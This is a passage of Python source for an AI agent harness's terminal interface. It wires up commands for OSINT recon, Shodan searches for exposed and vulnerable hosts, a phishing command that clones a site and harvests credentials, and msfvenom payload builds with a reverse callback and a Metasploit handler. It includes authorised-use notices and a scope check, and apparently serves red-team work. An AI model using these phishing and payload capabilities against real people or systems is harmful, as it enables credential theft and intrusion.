                    self._sys_line(f"launching {len(ev['workers'])} agents — {names}", ok=True)

            elif etype == "team_start":
                counter["running"] += 1
                col = colors.get(ev["name"], p.accent)
                brief = ev.get("brief", "")
                if len(brief) > 96:
                    brief = brief[:95] + "…"
                chat.write_block(R.agent_event_line(ev["name"], col, "▸", brief, p))
                bar.set_activity(
                    f"team {counter['running']}/{counter['total'] or '?'}", busy=True)

            elif etype == "team_text":
                col = colors.get(ev["name"], p.accent)
                chat.write_block(R.agent_line(ev["name"], ev["text"], col, p))

            elif etype == "team_tool":
                col = colors.get(ev["name"], p.accent)
                chat.write_block(R.agent_event_line(
                    ev["name"], col, ev.get("tool", "?"),
                    tools_mod.summarise_call(ev.get("tool", ""), ev.get("args") or {}, self.cfg),
                    p))

            elif etype == "team_result":
                col = colors.get(ev["name"], p.accent)
                output = (ev.get("output") or "").strip().splitlines()
                first = output[0][:96] if output else "(no output)"
                if len(output) > 1:
                    first += f"  … +{len(output) - 1} lines"
                chat.write_block(R.agent_event_line(
                    ev["name"], col, "✔" if ev.get("ok") else "✘", first, p,
                    ok=bool(ev.get("ok"))))

            elif etype == "team_done":
                counter["running"] = max(0, counter["running"] - 1)
                col = colors.get(ev["name"], p.accent)
                if ev.get("ok"):
                    detail = f"done · ${ev.get('cost', 0.0):.4f}"
                else:
                    detail = f"failed — {ev.get('error', 'unknown')}"
                chat.write_block(R.agent_event_line(
                    ev["name"], col, "■", detail, p, ok=bool(ev.get("ok"))))
                bar.set_activity(
                    f"team {counter['running']}/{counter['total'] or '?'}", busy=True)

            elif etype == "team_end":
                # Bank the workers' usage so the synthesis turn's `usage` events
                # add to it rather than replacing it.
                self._team_tokens = (
                    ev.get("input") or 0,
                    ev.get("output") or 0,
                    ev.get("cost") or 0.0,
                )
                bar.input_tokens = self.agent.session_input_tokens + self._team_tokens[0]
                bar.output_tokens = self.agent.session_output_tokens + self._team_tokens[1]
                bar.cost = self.agent.session_cost + self._team_tokens[2]
                bar.render_bar()

        spinner = asyncio.create_task(self._verb_spinner())
        chat.write_block(R.turn_marker(self.agent.turn_count + 1, p))
        chat.write_block(R.user_prompt_block(f"⚑ team: {task}", p))
        self._sys_line("analysing the task…")

        try:
            results = await team_mod.run_team(
                self.cfg, task,
                on_event=on_event,
                agent_factory=self._team_agent_factory,
            )
            if self._cancelled:
                return

            if not results:
                # No roster — do the task the ordinary way, on the main agent.
                # The planner cost a team, not the task.
                bar.set_activity("working", busy=True)
                async for ev in self.agent.run_turn(task):
                    if self._cancelled:
                        break
                    await self._handle_event(ev)
                return

            # ---- synthesis: the main brain folds the reports into one answer.
            good = sum(1 for r in results if r.ok)
            self._sys_line(f"synthesising {good}/{len(results)} results…")
            bar.set_activity("synthesising", busy=True)
            prompt = team_mod.synthesis_prompt(task, results)
            async for ev in self.agent.run_turn(prompt):
                if self._cancelled:
                    break
                await self._handle_event(ev)

        except asyncio.CancelledError:
            raise
        except Exception as e:  # noqa: BLE001
            chat.write_block(R.error_block(f"team failed: {type(e).__name__}: {e}", p))
        finally:
            spinner.cancel()
            self.busy = False
            chat.clear_stream()
            chat.card_finish()
            self._stream_buf = ""
            bar.set_activity("idle", busy=False)
            bar.turns = self.agent.turn_count
            bar.model = self.cfg.display_model
            bar.render_bar()
            self._sync_rails()
            self._set_rain(self.rain_on)
            if self._cancelled:
                self.agent.cancel_turn()
                self._sys_line("team interrupted", warn=True)
            self.query_one("#input", Input).focus()

    # ---- osint ------------------------------------------------------------
    def _cmd_osint(self, args) -> None:
        """/osint [kind] <target> — recon on a declared target.

        A router, not an engine: pick the kind, validate the target, open a
        case directory, then hand that kind's playbook to the main agent as a
        single turn. The playbook is long, so the transcript shows the short
        `/osint email <target>` label while the agent receives the briefing
        behind it — see _run_turn's `display`.
        """
        p = self.palette

        # Bare `/osint` → the menu, so the surface is discoverable without the
        # README.
        if not args:
            self._osint_menu()
            return

        kind_name = args[0].lower()
        kind = osint_mod.OSINT_KINDS.get(kind_name)
        if kind is None:
            self._sys_line(
                f"unknown osint kind: {kind_name} — try "
                + " | ".join(osint_mod.KIND_ORDER),
                warn=True,
            )
            return

        target = " ".join(args[1:]).strip()

        if not kind.built:
            # Name the kinds that *do* work rather than the one that does not:
            # the list grows every time a playbook lands, and a hard-coded
            # "email is the one that works" goes stale the moment it does.
            live = " ".join(n for n in osint_mod.KIND_ORDER
                            if osint_mod.OSINT_KINDS[n].built)
            self._sys_line(
                f"/osint {kind.name} is not built yet — try: {live}",
                warn=True,
            )
            return

        if not target:
            self._sys_line(f"usage: /osint {kind.name} <{kind.target_label}>", warn=True)
            return

        ok, err = osint_mod.validate(kind, target)
        if not ok:
            self._sys_line(
                f"usage: /osint {kind.name} <{kind.target_label}>  ({err})", warn=True
            )
            return

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        case = osint_mod.case_dir(self.cfg, kind, target)
        prompt = osint_mod.build_prompt(kind, target, case)
        label = osint_mod.normalise(kind, target)

        t = Text()
        t.append("  ◈ CASE      ", style=f"bold {p.accent}")
        t.append(f"{kind.name} · {label}\n", style=p.primary)
        t.append("  ◈ EVIDENCE  ", style=f"bold {p.accent}")
        t.append(str(case) + "\n", style=p.dim)
        t.append("  ◈ NOTICE    ", style=f"bold {p.amber}")
        t.append(
            "authorised use only — your own footprint, a consented audit, "
            "or a declared engagement\n",
            style=p.dim,
        )
        self.query_one(ChatPane).write_block(t)

        self._run_turn(
            prompt,
            display=f"⚑ /osint {kind.name} {label}",
            osint_case=case,
            # The whole point of the run is this file. Declaring it means a
            # model that narrates "Writing the report." and stops is asked
            # again, and one that still will not write it is reported as
            # having failed rather than ending in silence.
            deliverable=Deliverable(path=case / "report.md", label="report.md"),
        )

    def _finalise_osint(self, case: Path) -> None:
        """Archive the run's report, show it as a tree, clear the case directory.

        Reports are the one artefact worth keeping, so they move to
        ``<state_dir>/reports/`` and everything else — the clones, the raw API
        responses, the avatars — is deleted. A run that produced no report
        (failed, or interrupted before the write) is left untouched so the
        operator can see what it managed to collect.

        The tree is the point of the command ending here rather than on a path:
        a run that took twenty minutes should hand back its *findings*, not a
        filename. It is printed after the archive line so the path is still
        there for anyone who wants the full report.
        """
        report, cleaned = osint_mod.finalise_case(self.cfg, case)
        if report is not None:
            self._sys_line(f"report archived: {report}", ok=True)
            self._show_osint_tree(report)
            if cleaned:
                self._sys_line("case directory cleared (evidence discarded)")
        else:
            self._sys_line(
                f"no report found — case directory kept for inspection: {case}",
                warn=True,
            )

    def _show_osint_tree(self, report: Path) -> None:
        """Render an archived report as a tree in the transcript."""
        p = self.palette
        node = osint_tree_mod.parse_report_file(report)
        if not node.children:
            self._sys_line(
                f"no sections parsed from {report.name} — open it directly",
                warn=True)
            return

        t = Text()
        t.append("  ⚑ RESULT    ", style=f"bold {p.accent}")
        t.append(osint_tree_mod.summary_line(node), style=p.primary)
        t.append("\n")
        self.query_one(ChatPane).write_block(t)
        self.query_one(ChatPane).write_block(
            osint_tree_mod.render_tree(node, p))

    def _cmd_osint_tree(self, args) -> None:
        """/osint-tree [kind|path] — re-show a finished recon as a tree.

        The tree is printed when a run finalises, but a transcript scrolls and
        `/clear` empties it. Reports are archived permanently under
        ``<state_dir>/reports/``, so this reads one back — the answer to "show
        me that recon again", in this session or a later one. A case directory
        that never finalised counts too; see ``osint_tree.find_report``.
        """
        which = " ".join(args).strip() or None
        report = osint_tree_mod.find_report(self.cfg, which)
        if report is None:
            where = osint_mod.reports_dir(self.cfg)
            if which:
                # Say "recon", not "report": `<state_dir>/reports/` is shared
                # with /bug-hunt and /crack, so `/osint-tree crack` on a box
                # with crack reports archived would otherwise read as "that
                # file does not exist" when the truth is "that is not a recon".
                self._sys_line(
                    f"no recon report matches {which!r} — /osint-tree reads "
                    f"/osint runs only; try it with no argument for the latest",
                    warn=True)
            else:
                self._sys_line(
                    f"no recon reports found — run /osint first "
                    f"(archive: {where})", warn=True)
            return

        self._sys_line(f"report: {report}")
        self._show_osint_tree(report)

    def _osint_menu(self) -> None:
        """The kind list, shown by a bare `/osint`."""
        p = self.palette
        t = Text()
        t.append("  OSINT\n\n", style=f"bold {p.accent}")
        for name in osint_mod.KIND_ORDER:
            kind = osint_mod.OSINT_KINDS[name]
            built = kind.built
            t.append(f"  {'◉' if built else '○'} {name:<10}",
                     style=f"bold {p.accent}" if built else p.dim)
            t.append(kind.blurb + "\n", style=p.primary if built else p.dim)
        t.append("\n  usage: ", style=p.dim)
        t.append("/osint <kind> <target>\n", style=p.primary)
        # Read from cfg rather than hard-coding ~/.zimzilla: state_dir is
        # configurable, and a menu that names the wrong directory is worse
        # than one that names none.
        t.append("  evidence lands in ", style=p.dim)
        t.append(f"{Path(self.cfg.state_dir) / 'osint'}/<kind>-<target>-<stamp>/\n",
                 style=p.primary)
        self.query_one(ChatPane).write_block(t)

    # ---- leadgen ----------------------------------------------------------
    def _cmd_leadgen(self, args) -> None:
        """/leadgen <niche> <location> — local leads, passive audit, drafts.

        A router like `/osint`: validate the pair, open a case directory, then
        hand the phase sequence to the main agent as one turn — same tools,
        same scope guard, same transcript, same Ctrl+C.

        The split between the two halves is the only parsing decision here.
        Niche and location are both free text, so `--in` is the explicit
        separator: `/leadgen emergency plumbers --in Austin, TX` gives a
        two-word niche, while `/leadgen plumbers Austin TX` takes the first
        word as the niche and the rest as the location. Guessing further than
        that would silently run the wrong search.
        """
        p = self.palette

        if not args:
            self._leadgen_usage()
            return

        niche, location, err = self._leadgen_split(args)
        if err:
            self._sys_line(f"usage: /leadgen <niche> <location>  ({err})",
                           warn=True)
            return

        ok, err = leadgen_mod.validate(niche, location)
        if not ok:
            self._sys_line(f"usage: /leadgen <niche> <location>  ({err})",
                           warn=True)
            return

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        case = leadgen_mod.case_dir(self.cfg, niche, location)
        prompt = leadgen_mod.build_prompt(niche, location, case)

        t = Text()
        t.append("  ◈ CASE      ", style=f"bold {p.accent}")
        t.append(leadgen_mod.label(niche, location) + "\n", style=p.primary)
        t.append("  ◈ EVIDENCE  ", style=f"bold {p.accent}")
        t.append(str(case) + "\n", style=p.dim)
        # Which phases can actually run, before a single request is made: a
        # run with no Places key has no leads, and saying so here is kinder
        # than a report that opens with an empty discovery table.
        rows = leadgen_mod.plan()
        ready = [r["phase"] for r in rows if r["ready"]]
        skipped = [f"{r['phase']} {r['reason']}" for r in rows if not r["ready"]]
        t.append("  ◈ PHASES    ", style=f"bold {p.accent}")
        t.append(" · ".join(ready), style=p.primary)
        if skipped:
            t.append("\n              skipped: " + " · ".join(skipped),
                     style=p.dim)
        t.append("\n")
        t.append("  ◈ NOTICE    ", style=f"bold {p.amber}")
        t.append(
            "for businesses you have a legitimate reason to contact — "
            "drafts are written to disk, never sent\n",
            style=p.dim,
        )
        self.query_one(ChatPane).write_block(t)

        self._run_turn(
            prompt,
            display=f"⚑ /leadgen {leadgen_mod.label(niche, location)}",
            finalise=lambda: self._finalise_leadgen(case,
                                                    interrupted=self._cancelled),
            # The report is the run's product. Declaring it means a model that
            # narrates "Writing the report." and stops is asked again, and one
            # that still will not write it is reported as having failed rather
            # than ending in silence — the same contract /osint has.
            deliverable=Deliverable(path=case / "report.md", label="report.md"),
        )

    @staticmethod
    def _leadgen_split(args) -> tuple[str, str, str]:
        """Split the argument list into (niche, location, error)."""
        words = [str(a) for a in args]
        if "--in" in words:
            i = words.index("--in")
            if words.count("--in") > 1:
                return "", "", "use --in once"
            niche = " ".join(words[:i])
            location = " ".join(words[i + 1:])
        else:
            if len(words) < 2:
                return "", "", "give a niche and a location"
            niche, location = words[0], " ".join(words[1:])
        # A quoted location (`"Austin, TX"`) arrives as two tokens with the
        # quote characters still attached — the command line is split on
        # whitespace here, not by a shell.
        niche = " ".join(niche.replace('"', " ").split())
        location = " ".join(location.replace('"', " ").split())
        if not niche:
            return "", "", "no niche before --in"
        if not location:
            return "", "", "no location given"
        return niche, location, ""

    def _finalise_leadgen(self, case: Path, interrupted: bool = False) -> None:
        """Archive the report and the drafts, clear the working directory.

        The report says what was found; the drafts are what the operator
        actually sends. Both are kept, everything else — raw API responses,
        fetched HTML, the audit JSON the report already cites — is deleted. A
        run that produced no report is left exactly as it is, drafts and all,
        so the operator can see how far it got.

        An *interrupted* run is kept even when it got as far as writing the
        report. `/osint` archives in that case; this command does not, because
        the thing an interrupted lead run most needs is to be looked at — which
        leads were reached, which were refused, where it stopped — and a
        cleanup that deletes the audit trail the moment Ctrl+C lands is the
        wrong default for a run whose output is a judgement call.
        """
        if interrupted:
            self._sys_line(
                f"run interrupted — case directory kept for inspection: {case}",
                warn=True,
            )
            return

        report, cleaned = leadgen_mod.finalise_case(self.cfg, case)
        if report is not None:
            self._sys_line(f"report archived: {report}", ok=True)
            drafts = leadgen_mod.archived_drafts(self.cfg, case)
            if drafts.is_dir():
                n = len(list(drafts.glob("*.md")))
                self._sys_line(f"{n} draft(s) archived: {drafts}", ok=True)
            else:
                self._sys_line("no drafts written — every lead was clean, "
                               "skipped, or out of scope")
            if cleaned:
                self._sys_line("case directory cleared (raw audit data discarded)")
            else:
                self._sys_line(
                    f"case directory kept — cleanup could not finish: {case}",
                    warn=True,
                )
        else:
            self._sys_line(
                f"no report found — case directory kept for inspection: {case}",
                warn=True,
            )

    def _leadgen_usage(self) -> None:
        """The phase list and key status, shown by a bare `/leadgen`."""
        p = self.palette
        t = Text()
        t.append("  LEAD GEN\n\n", style=f"bold {p.accent}")
        for row in leadgen_mod.plan():
            ready = row["ready"]
            t.append(f"  {'◉' if ready else '○'} {row['phase']:<11}",
                     style=f"bold {p.accent}" if ready else p.dim)
            t.append(row["blurb"] + "\n", style=p.primary if ready else p.dim)
            if not ready:
                t.append(f"    {row['reason']}\n", style=p.dim)
        t.append("\n  usage: ", style=p.dim)
        t.append("/leadgen <niche> <location>\n", style=p.primary)
        t.append("         /leadgen emergency plumbers --in Austin, TX\n",
                 style=p.dim)
        t.append("\n  drafts are written to disk and never sent.\n",
                 style=p.dim)
        t.append("  cases land in ", style=p.dim)
        t.append(f"{Path(self.cfg.state_dir) / 'leadgen'}/"
                 "<niche>-<location>-<stamp>/\n", style=p.primary)
        self.query_one(ChatPane).write_block(t)

    # ---- Shodan -----------------------------------------------------------
    # A named search is a *read* of Shodan's index followed by one analysis
    # turn. Nothing here touches the hosts the index returns: the turn is
    # asked to rank and ask, not to act. See zimzilla/shodan.py.
    def _cmd_shodan_key(self, args) -> None:
        """/shodan-api-setup [key] — store the Shodan API key.

        Written to ~/.zimzilla/shodan/source, mode 600, in the same profile
        format every other credential uses. The key is never echoed back — the
        confirmation names the file and the last four characters.
        """
        p = self.palette
        if not args:
            creds = shodan_mod.load_credentials()
            t = Text()
            t.append("  SHODAN API KEY\n\n", style=f"bold {p.accent}")
            if creds is None:
                t.append("  no key set.\n\n", style=p.amber)
            else:
                _, origin = creds
                t.append("  source: ", style=p.dim)
                t.append(origin + "\n\n", style=p.primary)
            t.append("  set it with  ", style=p.dim)
            t.append("/shodan-api-setup <key>\n", style=f"bold {p.primary}")
            t.append("  get a key at  ", style=p.dim)
            t.append("https://account.shodan.io\n", style=p.primary)
            t.append(f"  stored in     {shodan_mod.PROFILE}\n", style=p.dim)
            t.append("  or export     ", style=p.dim)
            t.append(f"{shodan_mod.ENV_VAR}=<key>\n", style=p.primary)
            self.query_one(ChatPane).write_block(t)
            return

        key = args[0].strip().strip("'\"")
        if not shodan_mod.looks_like_key(key):
            self._sys_line(
                "that does not look like a Shodan API key — paste just the key, "
                "not the whole `export` line", warn=True)
            return

        path = shodan_mod.save_key(key)
        shodan_mod.remember_session_key(key)
        # The plan decides whether a search returns host rows or only counts,
        # and it is the first thing the operator needs to know about a new key.
        self._shodan_plan = None
        self._check_shodan_plan(key)
        self._sys_line(f"Shodan key saved (…{key[-4:]}) to {path}", ok=True)
        self._sys_line("try /shodan-cam-search, /shodan-db-search or /shodan-search")

    @work(exclusive=True, thread=True)
    def _check_shodan_plan(self, key: str) -> None:
        """Report the plan, and what it means for these commands."""
        plan, err = shodan_mod.fetch_plan(key)
        self.call_from_thread(self._show_shodan_plan, plan, err)

    def _show_shodan_plan(self, plan, err: str) -> None:
        p = self.palette
        if plan is None:
            self._sys_line(f"could not read the Shodan plan: {err}", warn=True)
            return
        self._shodan_plan = plan
        t = Text()
        t.append("  ◈ SHODAN    ", style=f"bold {p.accent}")
        t.append(f"plan: {plan.name}\n", style=f"bold {p.primary}")
        if plan.search:
            t.append("  ◈ RECORDS   ", style=f"bold {p.accent}")
            t.append("host records available — searches return rows and facets\n",
                     style=p.dim)
        else:
            t.append("  ◈ RECORDS   ", style=f"bold {p.amber}")
            t.append("counts and facets only\n", style=p.dim)
            t.append("  ◈ NOTE      ", style=f"bold {p.amber}")
            t.append("Shodan gates /shodan/host/search at membership, for every "
                     "query — no filter makes it work on a free key. These "
                     "commands still answer: total, countries, products, ports, "
                     "orgs and versions.\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    def _cmd_shodan_search(self, which: str, args) -> None:
        """/shodan-*-search — run a named search, then analyse the result.

        Parsing is shared by every facet: ``--limit N`` is stripped wherever it
        appears; for the fixed device facets a leading two-letter token is read
        as a country and anything after it is appended to the query verbatim.
        The two query-taking facets (``vuln``, ``raw``) use every remaining
        word as the query instead.
        """
        facet = shodan_mod.facet_for(which)
        if facet is None:                       # dispatch is static; belt and braces
            self._sys_line(f"unknown shodan search: {which}", warn=True)
            return

        # Flags first, so `--limit` cannot be mistaken for a country or a term.
        rest: list[str] = []
        limit = shodan_mod.DEFAULT_LIMIT
        i = 0
        while i < len(args):
            a = args[i]
            if a in ("--limit", "-n") and i + 1 < len(args):
                try:
                    limit = int(args[i + 1])
                except ValueError:
                    self._sys_line(f"--limit needs a number, not {args[i + 1]!r}",
                                   warn=True)
                    return
                i += 2
                continue
            if a.startswith("--limit="):
                try:
                    limit = int(a.split("=", 1)[1])
                except ValueError:
                    self._sys_line(f"--limit needs a number, not {a!r}", warn=True)
                    return
                i += 1
                continue
            rest.append(a)
            i += 1

        if limit < 1:
            self._sys_line("--limit must be at least 1", warn=True)
            return
        if limit > shodan_mod.MAX_LIMIT:
            self._sys_line(f"capping --limit at {shodan_mod.MAX_LIMIT}", warn=True)
            limit = shodan_mod.MAX_LIMIT

        creds = shodan_mod.load_credentials()
        if creds is None:
            self._sys_line(
                "no Shodan key — set one with /shodan-api-setup <key>", warn=True)
            return

        country = ""
        if facet is shodan_mod.RAW_FACET:
            query = " ".join(rest).strip()
        else:
            if rest and len(rest[0]) == 2 and rest[0].isalpha():
                country = rest[0].upper()
                rest = rest[1:]
            query = facet.build_query(country=country, extra=" ".join(rest))
        if not query:
            self._sys_line(
                f"usage: /{facet.command} {facet.target_label}", warn=True)
            return

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        key, origin = creds
        self._sys_line(f"Shodan: {facet.label} · {query}  ({origin})")
        self._fetch_shodan(key, facet, query, limit, country)

    @work(exclusive=True, thread=True)
    def _fetch_shodan(self, key: str, facet, query: str, limit: int,
                      country: str) -> None:
        """The blocking calls, off the UI thread, then a call back on it.

        The plan is fetched once per session and cached: it changes only when
        the operator buys a plan, and a second HTTP call on every search is a
        wasted query credit.
        """
        started = time.time()
        plan = getattr(self, "_shodan_plan", None)
        if plan is None:
            plan, _ = shodan_mod.fetch_plan(key)
        result, err = shodan_mod.describe(key, facet, query, plan=plan, limit=limit)
        self.call_from_thread(
            self._show_shodan, facet, query, country, result, err, started, plan)

    def _show_shodan(self, facet, query: str, country: str, result,
                     err: str, started: float, plan=None) -> None:
        """Render the result block, then start the analysis turn.

        A failed count gets the error and no turn. An empty population gets the
        block and a hint, but no turn either: asking a model to analyse nothing
        invites it to invent a population. A busy harness gets the block and no
        turn — the results are still worth reading, and interleaving a second
        turn is never safe.
        """
        p = self.palette
        if result is None:
            self._sys_line(f"Shodan: {err}", warn=True)
            return
        if plan is not None:
            self._shodan_plan = plan

        took = time.time() - started
        t = Text()
        t.append("  ◈ SHODAN    ", style=f"bold {p.accent}")
        t.append(f"{facet.label}", style=f"bold {p.primary}")
        if country:
            t.append(f" · country:{country}", style=p.primary)
        t.append("\n")
        t.append("  ◈ QUERY     ", style=f"bold {p.accent}")
        t.append(query + "\n", style=p.dim)
        t.append("  ◈ TOTAL     ", style=f"bold {p.accent}")
        t.append(f"{result.total:,} hosts · {took:.1f}s\n", style=p.primary)

        # The facets are the answer on a free plan and the shape on a paid one,
        # so they are always rendered — before the host rows, which may be
        # absent.
        for name in shodan_mod.FACET_FIELDS:
            values = result.top(name)
            if not values:
                continue
            t.append(f"  ◈ {name.upper():<9} ", style=f"bold {p.accent}")
            for i, v in enumerate(values):
                if i:
                    t.append(" · ", style=p.dim)
                t.append(v.value, style=p.primary)
                t.append(f" ({v.count:,})", style=p.dim)
            t.append("\n")

        if result.hosts:
            t.append(f"\n  ◈ HOSTS     ", style=f"bold {p.accent}")
            t.append(f"{len(result.hosts)} records\n", style=p.dim)
            for h in result.hosts:
                t.append("  ")
                t.append(f"{h.ip}:{h.port:<5}", style=f"bold {p.primary}")
                if h.org:
                    t.append(f"  {h.org}", style=p.dim)
                ident = h.identity
                if ident:
                    t.append(f"  [{ident}]", style=p.amber)
                place = ", ".join(x for x in (h.city, h.country) if x)
                if place:
                    t.append(f"  {place}", style=p.dim)
                if h.vulns:
                    t.append("  ⚠ " + ",".join(h.vulns[:4]), style=f"bold {p.red}")
                t.append("\n")
        elif result.search_error:
            # Say *why* there are no rows. "403 — Requires membership" is the
            # answer to "why is this different from what I see on the site".
            t.append("\n  ◈ ROWS      ", style=f"bold {p.amber}")
            t.append(f"none — {result.search_error}\n", style=p.dim)
        else:
            t.append("\n  ◈ ROWS      ", style=f"bold {p.amber}")
            t.append("none — this plan returns counts and facets only\n", style=p.dim)

        if result.total:
            t.append("\n  ◈ NEXT      ", style=f"bold {p.accent}")
            t.append("the working model analyses this and asks you to pick a task\n",
                     style=p.dim)
        else:
            t.append("\n  no matches — try a wider query or drop the country "
                     "filter\n", style=p.amber)
        self.query_one(ChatPane).write_block(t)

        if not result.total:
            return
        if self.busy:
            self._sys_line("results shown; harness is busy — no analysis turn",
                           warn=True)
            return

        self._run_turn(
            shodan_mod.build_prompt(facet, result, country),
            display=f"◈ /{facet.command}"
                    + (f" {country}" if country else "")
                    + ("" if facet is shodan_mod.RAW_FACET else f" · {query}"),
        )

    # ---- /phish -----------------------------------------------------------
    def _cmd_phish(self, args) -> None:
        """/phish <host> — clone, serve, tunnel, harvest.

        Subcommands: ``stop`` tears the campaign down, ``status`` reprints
        the live URLs. A second ``/phish <host>`` replaces the running one.
        """
        if not args:
            self._phish_usage()
            return
        verb = args[0].lower()
        if verb in {"stop", "off", "kill"}:
            self._phish_stop()
            return
        if verb in {"status", "info"}:
            self._phish_status()
            return

        target = " ".join(args).strip()
        ok, err = phish_mod.validate_target(target)
        if not ok:
            self._sys_line(f"usage: /phish <host>  ({err})", warn=True)
            return

        host = phish_mod.normalise_target(target)
        allowed, reason = self.agent.scope.allows(host)
        if not allowed:
            self._sys_line(f"⛔ BLOCKED — {host} — {reason}", warn=True)
            return

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        pane = self._zim_pane()
        if pane is not None:
            pane.show_campaign(host)

        p = self.palette
        t = Text()
        t.append("  ◈ PHISH     ", style=f"bold {p.accent}")
        t.append(f"{host}\n", style=p.primary)
        t.append("  ◈ NOTICE    ", style=f"bold {p.amber}")
        t.append(
            "authorised use only — your own property, a consented audit, "
            "or a declared engagement\n",
            style=p.dim,
        )
        self.query_one(ChatPane).write_block(t)
        self._launch_phish(target)

    # ---- /payload ----------------------------------------------------------
    def _cmd_payload(self, args) -> None:
        """/payload <ext> — analyse an extension, build a payload, print the listener.

        Deterministic, not a model turn: the extension is looked up in a table
        whose every pairing was measured against a real msfvenom, the argv is
        built from that row, and the build runs as a subprocess. Nothing here
        asks a model what an APK payload looks like, because the answer is a
        binary the operator is about to deliver and "the model recalled it"
        is not a good enough provenance for that.

        `--dry-run` prints the exact argv and builds nothing, which is the
        flag that makes this safe to point at a format you are unsure of. The
        argv it prints is the one the real run would use — same function, so
        the two cannot drift.
        """
        p = self.palette

        if not args:
            self._payload_list()
            return

        # `list` is a verb as well as the no-argument default, so
        # `/payload list` reads the way an operator expects.
        if args[0].lower() in ("list", "ls", "--list"):
            self._payload_list()
            return

        opts, err = _parse_payload_args(args)
        if err:
            self._sys_line(err, warn=True)
            return

        spec = payload_mod.resolve(opts["ext"])
        if spec is None:
            known = " ".join(payload_mod.extensions())
            self._sys_line(
                f"unknown extension: {opts['ext']} — /payload with no argument "
                f"lists them all", warn=True)
            self._sys_line(f"  {known}", warn=False)
            return

        lhost = opts["lhost"] or payload_mod.default_lhost()
        lport = opts["lport"]

        # The analysis is printed before anything is built, so a wrong
        # extension is caught by reading rather than by waiting for a build.
        self.query_one(ChatPane).write_block(
            self._render_payload_analysis(spec, lhost, lport, opts))

        if opts["handler_only"]:
            self._sys_line("--handler — nothing was built", ok=True)
            return

        if opts["dry_run"]:
            self._sys_line(
                "--dry-run — nothing was built, nothing was sent", ok=True)
            return

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        case = payload_mod.case_dir(self.cfg, spec)
        out = Path(opts["out"]) if opts["out"] else case / payload_mod.output_name(
            spec, opts["payload"])

        # A template is resolved through the jail like every other path this
        # harness is handed: a bare `app.apk` has to mean `<workdir>/app.apk`,
        # not whatever the process cwd happens to be.
        template = None
        if opts["template"]:
            from ..sandbox import SandboxError, resolve_in_jail
            try:
                template = resolve_in_jail(
                    self.cfg.workdir, opts["template"], self.cfg.unsafe,
                    must_exist=True)
            except SandboxError as exc:
                self._sys_line(f"refused: {exc}", warn=True)
                return
            # APK templates are the one case msfvenom refuses on an old
            # apktool, and it refuses *after* unpacking — so it is checked
            # here, before the build, and the reason is named.
            if spec.ext == "apk":
                ok, why = payload_mod.apktool_supports_template()
                if not ok:
                    self._sys_line(
                        f"cannot use an APK template here: {why}", warn=True)
                    return

        self._sys_line(f"building {spec.ext} — this takes a few seconds…")
        self._build_payload(spec, lhost, lport, out, opts, template, case)

    @work(exclusive=True, thread=True)
    def _build_payload(self, spec, lhost, lport, out, opts, template,
                       case) -> None:
        """The blocking build, off the UI thread, then a call back on it.

        msfvenom takes seconds — an APK with a template takes longer — and a
        frozen TUI during a build reads as a hang. Same shape as every other
        blocking call in this file.
        """
        build = payload_mod.generate(
            spec, lhost=lhost, lport=lport, out=out,
            payload=opts["payload"], encoder=opts["encoder"],
            iterations=opts["iterations"], bad_chars=opts["bad_chars"],
            template=template,
        )
        self.call_from_thread(self._show_payload_build, build, case)

    def _show_payload_build(self, build, case: Path) -> None:
        """Report the build, write the handler, and say where both landed."""
        p = self.palette
        if not build.ok:
            self._sys_line(f"build failed: {build.error}", warn=True)
            # msfvenom's own output is the useful part when it fails, and it
            # is already captured — showing the tail costs nothing and saves
            # the operator re-running it by hand to see why.
            tail = (build.stderr or build.stdout or "").strip().splitlines()
            for line in tail[-6:]:
                self._sys_line(f"  {line}")
            return

        rc = case / "handler.rc"
        try:
            rc.write_text(
                payload_mod.handler_rc(build.spec, build.lhost, build.lport,
                                       build.payload),
                encoding="utf-8")
        except OSError:
            rc = None

        t = Text()
        t.append("  ◈ BUILT     ", style=f"bold {p.accent}")
        t.append(f"{build.out}\n", style=f"bold {p.primary}")
        t.append("  ◈ SIZE      ", style=f"bold {p.accent}")
        t.append(f"{payload_mod.human_size(build.size)}", style=p.primary)
        t.append(f"   in {build.seconds:.1f}s\n", style=p.dim)
        if build.sha256:
            t.append("  ◈ SHA256    ", style=f"bold {p.accent}")
            t.append(build.sha256[:32] + "…\n", style=p.dim)
        t.append("  ◈ PAYLOAD   ", style=f"bold {p.accent}")
        t.append(f"{build.payload}\n", style=p.primary)
        t.append("  ◈ CALLBACK  ", style=f"bold {p.accent}")
        t.append(f"{build.lhost}:{build.lport}\n", style=p.primary)
        if rc is not None:
            t.append("  ◈ HANDLER   ", style=f"bold {p.accent}")
            t.append(f"{rc}\n", style=p.dim)
        t.append("  ◈ CASE      ", style=f"bold {p.accent}")
        t.append(f"{case}\n", style=p.dim)
        t.append("\n  catch it with  ", style=p.dim)
        t.append(f"msfconsole -r {rc}" if rc else "msfconsole", style=p.primary)
        t.append("\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    def _render_payload_analysis(self, spec, lhost, lport, opts) -> Text:
        """The analysis half: what this extension is, and what will be built.

        Printed before the build on purpose. An operator who typed the wrong
        extension sees it here, in the label and the "runs on" line, rather
        than after a build they did not want.
        """
        p = self.palette
        t = Text()
        t.append("  ◈ EXTENSION ", style=f"bold {p.accent}")
        t.append(f".{spec.ext}", style=f"bold {p.primary}")
        t.append(f"  {spec.label}\n", style=p.dim)
        t.append("  ◈ RUNS ON   ", style=f"bold {p.accent}")
        t.append(spec.runs_on + "\n", style=p.primary)
        t.append("  ◈ FORMAT    ", style=f"bold {p.accent}")
        if spec.format:
            t.append(f"-f {spec.format}\n", style=p.primary)
        else:
            t.append("(implied by the payload — `-f apk` is an error)\n",
                     style=p.amber)
        t.append("  ◈ PAYLOAD   ", style=f"bold {p.accent}")
        t.append(f"{opts['payload'] or spec.payload}\n", style=p.primary)
        t.append("  ◈ CALLBACK  ", style=f"bold {p.accent}")
        t.append(f"{lhost}:{lport}", style=p.primary)
        if not opts["lhost"]:
            t.append("  (this host's outbound address)", style=p.dim)
        t.append("\n")

        if spec.alternatives:
            t.append("  ◈ ALSO      ", style=f"bold {p.accent}")
